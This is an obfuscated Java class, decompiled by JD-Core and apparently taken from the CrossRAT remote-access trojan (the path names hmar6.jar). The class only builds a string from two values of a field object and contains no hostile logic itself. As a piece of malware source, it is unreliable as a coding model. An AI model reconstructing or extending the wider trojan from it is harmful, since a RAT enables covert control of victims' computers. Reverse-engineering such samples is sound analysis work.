package a.b;

import a.b;
import java.io.Serializable;

public final class g
  extends a.d
  implements Serializable
{
  private d a;
  
  private g(d paramd, b paramb)
  {
    super(a.c.c, paramb);
    this.a = paramd;
  }
  
  public g()
  {
    this(c.d(), b.a());
  }
  
  public g(d paramd)
  {
    this(paramd, b.a());
  }
  
  public final String b()
  {
    Object localObject = (localObject = this.a.a()).c();
    if (this.a.b() != null) {
      localObject = localObject + " " + this.a.b();
    }
    return (String)localObject;
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\a\b\g.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */